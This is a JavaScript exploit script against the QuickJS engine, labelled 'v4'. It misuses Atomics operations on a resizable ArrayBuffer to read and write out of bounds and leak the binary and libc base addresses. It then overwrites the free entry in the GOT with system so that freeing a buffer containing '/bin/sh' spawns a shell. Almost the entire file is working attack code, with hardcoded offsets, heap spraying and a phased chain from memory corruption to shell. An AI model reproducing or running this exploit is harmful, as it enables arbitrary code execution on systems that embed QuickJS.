// QuickJS Atomics RAB Resize Exploit v4
// GOT overwrite: free@GOT -> system, then trigger free("/bin/sh")

function hex(n) {
    if (typeof n === 'bigint') return '0x' + n.toString(16);
    return '0x' + (n >>> 0).toString(16);
}

let keepAlive = [];

// Libc offsets
const LIBC_FREE_OFFSET = BigInt(0xa3240);
const LIBC_SYSTEM_OFFSET = BigInt(0x53110);
const LIBC_BINSH_OFFSET = BigInt(0x1a7ea4);
const QJSC_FREE_FUNC_OFFSET = BigInt(0x14bc0);
const GOT_FREE_OFFSET = BigInt(0x10b008);

// Phase 1: Leak binary base
let victim1 = new ArrayBuffer(56, { maxByteLength: 4096 });
let view1 = new BigUint64Array(victim1);
keepAlive.push(victim1, view1);

let freeFunc = Atomics.add(view1, 6, {
    valueOf: function() {
        victim1.resize(4096);
        for (let i = 0; i < 100; i++) {
            keepAlive.push(new ArrayBuffer(64));
        }
        return BigInt(0);
    }
});

let binaryBase = freeFunc - QJSC_FREE_FUNC_OFFSET;
let gotFree = binaryBase + GOT_FREE_OFFSET;

// Phase 2: Create OOB buffer
let victim2 = new ArrayBuffer(56, { maxByteLength: 4096 });
let view2 = new BigUint64Array(victim2);
keepAlive.push(victim2, view2);

let spray2 = [];
Atomics.store(view2, 0, {
    valueOf: function() {
        victim2.resize(4096);
        for (let i = 0; i < 500; i++) {
            let ab = new ArrayBuffer(64);
            spray2.push(ab);
            keepAlive.push(ab);
        }
        return BigInt("0xFFFFFFFF7FFFFFFF");
    }
});

let oobBuffer = null;
let oobIdx = -1;
for (let i = 0; i < spray2.length; i++) {
    if (spray2[i].byteLength > 64) {
        oobBuffer = spray2[i];
        oobIdx = i;
        break;
    }
}

let oobView = new DataView(oobBuffer);

// Phase 3: Find structures
let structures = [];
for (let offset = 64; offset < 65536; offset += 8) {
    try {
        let val = oobView.getBigUint64(offset, true);
        if (val === BigInt("0xFFFFFFFF00000040")) {
            let freeFuncPtr = oobView.getBigUint64(offset + 48, true);
            if (freeFuncPtr === freeFunc) {
                structures.push({
                    headerOffset: offset,
                    dataOffset: offset + 16,
                    opaqueOffset: offset + 40,
                    freeFuncOffset: offset + 48
                });
            }
        }
    } catch(e) {
        break;
    }
}

// Phase 4: Leak libc
let struct0 = structures[0];
let origDataPtr = oobView.getBigUint64(struct0.dataOffset, true);
oobView.setBigUint64(struct0.dataOffset, gotFree, true);

let libcFree = BigInt(0);
let gotReaderIdx = -1;
for (let i = 0; i < spray2.length; i++) {
    if (i === oobIdx) continue;
    try {
        if (spray2[i].byteLength !== 64) continue;
        let testView = new DataView(spray2[i]);
        let val = testView.getBigUint64(0, true);
        if (val > BigInt("0x7f0000000000") && val < BigInt("0x800000000000")) {
            libcFree = val;
            gotReaderIdx = i;
            break;
        }
    } catch(e) {}
}

// Calculate addresses
let libcBase = libcFree - LIBC_FREE_OFFSET;
let systemAddr = libcBase + LIBC_SYSTEM_OFFSET;
let binshAddr = libcBase + LIBC_BINSH_OFFSET;

// Phase 5: Create a buffer with "/bin/sh" that will be freed
// We'll write /bin/sh at a known location and then free it
let cmdBuffer = new ArrayBuffer(64);
let cmdView = new Uint8Array(cmdBuffer);
// "/bin/sh\0"
cmdView[0] = 0x2f;
cmdView[1] = 0x62;
cmdView[2] = 0x69;
cmdView[3] = 0x6e;
cmdView[4] = 0x2f;
cmdView[5] = 0x73;
cmdView[6] = 0x68;
cmdView[7] = 0x00;

// Phase 6: Overwrite GOT[free] with system
// The GOT reader spray2[gotReaderIdx] now points to GOT
// Write system address there
let gotWriter = new DataView(spray2[gotReaderIdx]);
gotWriter.setBigUint64(0, systemAddr, true);

// Now GOT[free] = system!

// Phase 7: Trigger free("/bin/sh")
// When we release cmdBuffer, QuickJS will call free(cmdBuffer->data)
// But free is now system, so it becomes system(cmdBuffer->data)
// cmdBuffer->data contains "/bin/sh"

// BUT WAIT - the data pointer points to the 64-byte data area, not the start!
// We need the JSArrayBuffer's data pointer to point to /bin/sh

// Actually, the ArrayBuffer's data already starts with /bin/sh
// When freed, it will call free(data) where data points to /bin/sh bytes
// So system("/bin/sh") should work!

// Release cmdBuffer to trigger free (now system)
cmdBuffer = null;
cmdView = null;

// Restore original data pointer in OOB to avoid crash
oobView.setBigUint64(struct0.dataOffset, origDataPtr, true);

// Force GC to free cmdBuffer
for (let i = 0; i < 50000; i++) {
    new ArrayBuffer(1024);
}

// More GC pressure
try {
    for (let i = 0; i < 500000; i++) {
        new ArrayBuffer(64);
    }
} catch(e) {}
